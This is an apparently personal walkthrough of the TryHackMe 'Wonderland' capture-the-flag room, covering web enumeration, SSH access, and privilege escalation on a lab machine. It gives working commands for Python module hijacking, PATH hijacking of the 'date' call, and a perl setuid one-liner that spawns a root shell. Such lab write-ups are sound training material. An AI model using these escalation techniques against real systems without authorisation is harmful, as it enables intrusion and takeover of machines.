
# TryHackMe: Wonderland

---
[Back to Table of Contents](../cysec)

---
## Initial Scans and Enumeration:

 >### nmap:
```
Nmap scan report for 10.10.81.208 
Host is up (0.21s latency). 
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
>### GOBuster:
- /img
- /css
- /r 
---

>## Website:


### /img/
- alice_door.jpg
- alice_door.png
	- Both the same photo, but the jpg is brighter, whereas the png has an off-white color. Perhaps just from compression? Maybe important? 
- white_rabbit_1.jpg

---

### Steganography
I used my own steganography/image analysis tool, PhotoSecUtils and found some interesting info in the photos. 
index.jpeg
 - follow the r a b b i t

alice_door.jpg
- xml file / xmp metadata -- file was edited in photoshop, on a mac. There is quite a bit of info in here, but after spending time looking into this, I think it may be a rabbit hole. 

alice_door.png

---

Back to the GOBuster scan, I went to /r/ to see what it was. The page contained what appeared to be a clue:
```
 `Keep Going.

"Would you tell me, please, which way I ought to go from here?"`
```

Since it says "Keep going," I decided to rerun GoBuster on the /r/ directory specifically. 

I also decided to try some random letters, and with some luck, /a/ provided another clue:
-/r/a/ : 
```
`Keep Going.

"That depends a good deal on where you want to get to," said the Cat.`
```
At this point, it seemed as though the constant references to "rabbit" were referring to the directory path, and sure enough, the path ended up as:

 - http://ip_addr/r/a/b/b/i/t/

In the source code the final page, an interesting string appeared:
alice:***redacted***
- Possibly a password? Nmap showed that SSH was open. 
	- This did work as the SSH password -- we now have a foothold on the system!
	
---
	
## Foothold

Immediately upon entering and running 'ls', we see a 'root.txt' file, but of course, permission denied. 
Theres another interesting file, called 'walrus_and_the_carpenter.py'

We do have permission to cat this file, and it contains numerous "poems" and a function that randomly selects some of them to output. 

```
sudo -l
```
shows that we can run this python script as root, from user rabbit:
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
	

The contents of the file itself don't seem to be of any use, but my first thought was to echo a privesc exploit from GTFOBins into the file. This, however, is not possible as the file is not writable by user Alice.

I then decided to cd to / and see if any other obvious privesc exploits could be used:
```
find . -perm /4000
find . -perm /4000
cd /usr/bin 
ls -lah | grep alice
```
These searches did not return anything that seemed useful.
At this point I was stuck; I decided to look into ways others have used to escalate via the python script and found python module hijacking. 

---

### Python Module Hijacking --> Horizontal PrivEsc
Basically, a fake module can be made, which when imported, will execute the malicious code rather than the module code intended. The python file, "walrus_and_the_carpenter.py" imports the random module, so in order to perform a module hijacking attack, I created a fake random.py file and added simple code.
```
touch random.py
nano random.py
```
random.py:
```python
import os
os.system('/bin/bash')
```

After running the python script:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```
 
 I now was user rabbit. My first move was to change directories to rabbits home, and found an ELF file owned by root. 
 Running file to analyse the binary showed that it is a setuid / setgid ELF executable.
 
Running the script outputs:
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped) --> seems to be written into the file and not an actual error?
```

I ran a local python server to download and further analyze the file on my machine:

```
...
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
...
```

I knew that this would be the key to escalating, but wasn't sure exactly how, so I decided to look into ways this could be done, and settled on the following method.
While the path is provided for /bin/echo, it is not provided for date --> possibly another hijacking / imitation attack or path attack.

---

### Path Exploitation --> Horizontal PrivEsc

The attack overview:
Create a malicious date file with desired command --> export to path and set run permission --> run file
```
mkdir date_ && cd date_
touch date
nano date
```
date:
```bash
#!/bin/bash 
/bin/bash -p
```
Then:
```bash
chmod +x date
export PATH=/home/rabbit/date:$PATH
```

At this point, we have user Hatter ID, but not GID. Before looking for any escalation methods, I cd'd over to Hatter's home directory to check for a user flag/useful hints:
```
cd /home/hatter
ls --> password.txt
```
This appeared to be Hatter's password, so I tried it:
```
su hatter --> password worked
```
Now, we have full access to the user Hatter. 

### Vertical PrivEsc --> root

Before going the automated route, I decided to see if I could find any privesc routes manually:

```
cd /

find . -perm /4000 --> nothing useful
find . -perm /2000 --> nothing useful 

find . -user hatter -perm /4000  .. /2000 --> nothing useful

cd /usr/bin 
ls -lah | grep hatter --> perl?
```
The last search returned a strange result for perl.
I searched for Perl in GTFOBins and found a few different methods for privesc. I tried:
```
sudo perl -e 'exec "/bin/sh";'

--> hatter is not in the sudoers file.  This incident will be reported.

```
and then:
```
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
This worked! 
```
id --> root
```

I then quickly returned to Alice's home directory to read the root.txt file found earlier:
```
cd /home/alice
cat root.txt --> flag
```

But where is the user flag? I then remembered the hint for the user flag --> "Everything is upside down here." Maybe the user flag is in the root directory, since the root flag was in the user directory?
 
 ```
 cd /root --> ls --> user.txt 
 cat user.txt --> flag!
 ```
 
 -----------------
---
 
 ### Note
 
I found this CTF to be extremely valuable; I learned a lot about module/command hijacking and path exploitation through the rooms' various layers of exploitation. There were a few things that I needed to search for that I wasn't very familiar with previously, which I can now add to my mental toolkit and use to grow and expand my skills.

